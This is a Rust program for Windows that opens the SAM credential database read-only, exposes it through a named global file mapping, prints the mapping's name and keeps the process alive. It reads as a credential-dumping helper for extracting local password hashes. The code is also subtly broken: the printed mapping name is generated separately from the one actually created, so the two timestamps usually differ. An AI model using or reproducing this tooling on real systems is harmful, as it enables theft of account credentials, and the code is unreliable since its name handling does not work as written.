use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null;
use windows_sys::Win32::Foundation::{GENERIC_READ, GetLastError};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, OPEN_EXISTING, FILE_SHARE_READ,
};
use windows_sys::Win32::System::Memory::CreateFileMappingW;
use windows_sys::Win32::System::SystemInformation::GetSystemWindowsDirectoryW;

fn main() {
    // Step 1: Get the Windows system directory
    let sys_dir = match get_system_directory() {
        Ok(dir) => dir,
        Err(_) => std::process::exit(4),
    };

    // Step 2: Construct the SAM file path
    let sam_path = format!("{}\\config\\SAM", sys_dir);

    // Step 3: Open the SAM file
    let file_handle = match open_sam_file(&sam_path) {
        Ok(handle) => handle,
        Err(code) => std::process::exit(code),
    };

    // Step 4: Create the memory mapping
    let mapping_handle = match create_memory_mapping(file_handle) {
        Ok(handle) => handle,
        Err(code) => std::process::exit(code),
    };

    // Step 5: Output the mapping name
    let mapping_name = get_mapping_name();
    println!("{}", mapping_name);

    // Step 6: Keep the mapping alive by preventing cleanup
    let _ = file_handle;
    let _ = mapping_handle;

    // Keep the process alive
    loop {
        std::thread::sleep(std::time::Duration::from_secs(60));
    }
}

fn get_system_directory() -> Result<String, ()> {
    let mut buffer = vec![0u16; 260];
    let len = unsafe {
        GetSystemWindowsDirectoryW(buffer.as_mut_ptr(), buffer.len() as u32)
    };

    if len == 0 {
        return Err(());
    }

    buffer.truncate(len as usize);
    Ok(String::from_utf16_lossy(&buffer).to_string())
}

fn open_sam_file(path: &str) -> Result<isize, i32> {
    let wide_path: Vec<u16> = OsStr::new(path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let file_handle = unsafe {
        CreateFileW(
            wide_path.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ,
            null(),
            OPEN_EXISTING,
            0,
            0,
        )
    };

    if file_handle == -1 {
        let error = unsafe { GetLastError() };
        return match error {
            5 => Err(2),  // ERROR_ACCESS_DENIED
            2 => Err(1),  // ERROR_FILE_NOT_FOUND
            _ => Err(4),  // Other errors
        };
    }

    Ok(file_handle)
}

fn create_memory_mapping(file_handle: isize) -> Result<isize, i32> {
    let mapping_name = get_mapping_name();
    let wide_name: Vec<u16> = OsStr::new(&mapping_name)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let mapping_handle = unsafe {
        CreateFileMappingW(
            file_handle,
            null(),
            4, // PAGE_READONLY
            0,
            0,
            wide_name.as_ptr(),
        )
    };

    if mapping_handle == 0 {
        return Err(4); // Mapping creation failed
    }

    Ok(mapping_handle)
}

fn get_mapping_name() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};

    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);

    format!("Global\\SAM_Backup_{}", timestamp)
}
